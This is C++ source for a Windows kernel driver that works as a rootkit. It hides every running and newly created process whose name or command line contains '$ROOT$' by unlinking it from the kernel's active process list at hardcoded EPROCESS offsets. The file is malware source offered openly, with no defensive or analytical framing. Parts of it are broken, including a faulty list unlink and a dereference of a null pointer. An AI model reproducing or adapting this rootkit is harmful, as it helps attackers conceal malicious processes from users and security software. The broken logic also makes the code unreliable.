#include<Ntifs.h>
#include <ntddk.h>
#include <WinDef.h>



void sCreateProcessNotifyRoutineEx(PEPROCESS process, HANDLE pid, PPS_CREATE_NOTIFY_INFO createInfo);

void SampleUnload(_In_ PDRIVER_OBJECT DriverObject) {
	UNREFERENCED_PARAMETER(DriverObject);
	PsSetCreateProcessNotifyRoutineEx(sCreateProcessNotifyRoutineEx, TRUE);
	DbgPrint("Sample driver Unload called\n");
}

//Hidining process by his pid
NTSTATUS HideProcess(int UniqueProcessId) {
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID pid = { 0 };

	pid.UniqueProcess = (HANDLE)UniqueProcessId; //The pid of the process you want to hide
	
	//Opening the process
	if (ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &pid) != STATUS_SUCCESS) {
		DbgPrint("Can't open the process");
		ZwClose(hProcess);
		return STATUS_ACCESS_DENIED;
	}

	//Check if the process is valid
	if (hProcess == NULL) {
		DbgPrint("The handle to the process is NULL");
		ZwClose(hProcess);
		return STATUS_SUCCESS;
	}

	PEPROCESS EP;
	
	//Getting the EPROCESS structure
	if (::PsLookupProcessByProcessId(pid.UniqueProcess, &EP) == STATUS_INVALID_PARAMETER) {
		ObDereferenceObject(EP);
		DbgPrint("Can't get EPROCESS");
		return STATUS_INVALID_PARAMETER;
	}

	//Deleting the process from the LIST_ENTRY process list
	LIST_ENTRY list_entry = *((LIST_ENTRY*)((LPBYTE)EP + 0x448));
	list_entry.Blink->Flink = list_entry.Flink;
	list_entry.Flink->Blink = list_entry.Blink->Flink;
	

	//Closing the handle
	ZwClose(hProcess);
	return STATUS_SUCCESS;
}

//Getting process pid by his name
int getPIDByName(wchar_t* name) {
	PEPROCESS ep;

	//Getting the Eprocess structure of the current process
	if (::PsLookupProcessByProcessId(::PsGetCurrentProcessId(), &ep) == STATUS_INVALID_PARAMETER) {
		ObDereferenceObject(ep);
		DbgPrint("Can't get EPROCESS");
		return STATUS_INVALID_PARAMETER;
	}


	PUNICODE_STRING Path = NULL;
	//Getting the image name
	::SeLocateProcessImageName(ep, &Path);
	
	//Getting the ActiveProcessLinks of the process
	PLIST_ENTRY Process_List_Entry = ((LIST_ENTRY*)((LPBYTE)ep + 0x448));
	PLIST_ENTRY List_Entry = Process_List_Entry->Flink;
	LPBYTE pUpi;
	DbgPrint("Starting with buffer path: %wZ", Path);

	//Skiping all the process with null image name
	while (Path->Buffer == NULL) {
		DbgPrint("The buffer is null so going forward to next process: %wZ", Path);
		//Getting the EPROCESS of ActiveProcessLinks
		pUpi = ((LPBYTE)List_Entry) - 0x448;
		ep = ((PEPROCESS)pUpi);
		::SeLocateProcessImageName(ep, &Path);
		List_Entry = List_Entry->Flink;
	}

	DbgPrint("1.The path is: %wZ", Path);
	//Searching the process by his name 
	while (wcsstr(Path->Buffer, name) == NULL && Process_List_Entry != List_Entry->Flink) {
		pUpi = ((LPBYTE)List_Entry) - 0x448;
		ep = ((PEPROCESS)pUpi);
		::SeLocateProcessImageName(ep, &Path);
		DbgPrint("2. The path is: %wZ", (const wchar_t*)Path);
		List_Entry = List_Entry->Flink;
	}
	if (Process_List_Entry == List_Entry->Flink) {
		DbgPrint("%wZ isn't running quiting!", name);
		return STATUS_SUCCESS;
	}
	pUpi = ((LPBYTE)List_Entry->Blink) - 0x448 + 0x440;
	int UniqueProcessId = *((int*)pUpi); //Process PID
	DbgPrint("The PID of %ls is %d\n", name, UniqueProcessId);
	return UniqueProcessId;
}

//Hiding all the running processes that their name is starts with $ROOT$
NTSTATUS HideProcesses() {
	PEPROCESS EP;
	if (::PsLookupProcessByProcessId(::PsGetCurrentProcessId(), &EP) == STATUS_INVALID_PARAMETER) {
		ObDereferenceObject(EP);
		DbgPrint("Can't get EPROCESS");
		return STATUS_INVALID_PARAMETER;
	}
	
	PUNICODE_STRING Path = NULL;
	int UniqueProcessId;
	LPBYTE pUpi;
	PLIST_ENTRY list_entry = ((LIST_ENTRY*)((LPBYTE)EP + 0x448));
	PLIST_ENTRY Process_List_Entry = list_entry;

	


	//Checking if the current process name starts with $ROOT$

	if (Path->Buffer != NULL) {
		DbgPrint("The path is: %wZ", (const wchar_t*)Path);

		if (wcsstr(Path->Buffer, L"$ROOT$") != NULL) {
			pUpi = ((LPBYTE)Process_List_Entry) - 0x448 + 0x440;
			UniqueProcessId = *((int*)pUpi);
			DbgPrint("The PID is %d\n", UniqueProcessId);
			HideProcess(UniqueProcessId);
		}
	}
	Process_List_Entry = Process_List_Entry->Flink;
	pUpi = ((LPBYTE)Process_List_Entry) - 0x448;
	EP = ((PEPROCESS)pUpi);


	//Hiding the processes that starts with $ROOT$
	while (Process_List_Entry != list_entry) {
		::SeLocateProcessImageName(EP, &Path);

		if (Path->Buffer != NULL) {
			DbgPrint("The path is: %wZ", (const wchar_t*)Path);
			
			if (wcsstr(Path->Buffer, L"$ROOT$") != NULL) {
				pUpi = ((LPBYTE)Process_List_Entry) - 0x448 + 0x440;
				UniqueProcessId = *((int*)pUpi);
				DbgPrint("The PID is %d\n", UniqueProcessId);
				HideProcess(UniqueProcessId);
			}
		}
		Process_List_Entry = Process_List_Entry->Flink;
		pUpi = ((LPBYTE)Process_List_Entry) - 0x448;
		EP = ((PEPROCESS)pUpi);
	}
	return STATUS_SUCCESS;
}



//Hiding every new process that his name starts with $ROOT$
void sCreateProcessNotifyRoutineEx(PEPROCESS process, HANDLE pid, PPS_CREATE_NOTIFY_INFO createInfo)
{
	UNREFERENCED_PARAMETER(pid);
	
	if (createInfo != NULL)
	{
		//Checking if the process name is starting with $ROOT$
		if (wcsstr(createInfo->CommandLine->Buffer, L"$ROOT$") != NULL)
		{
			LPBYTE pUpi = ((LPBYTE)process) - 0x448 + 0x440;
			int UniqueProcessId = *((int*)pUpi);
			//Hiding the process
			if (!NT_SUCCESS(HideProcess(UniqueProcessId)))
				DbgPrint("Can't hide the process with pid: %d" , UniqueProcessId);
		}
	}
}




extern "C"
NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);
	DriverObject->DriverUnload = SampleUnload;
	DbgPrint("Sample driver Load called\n");


	HideProcesses();
	PsSetCreateProcessNotifyRoutineEx(sCreateProcessNotifyRoutineEx, FALSE);
	DbgPrint("Finish");

	return STATUS_SUCCESS;
}
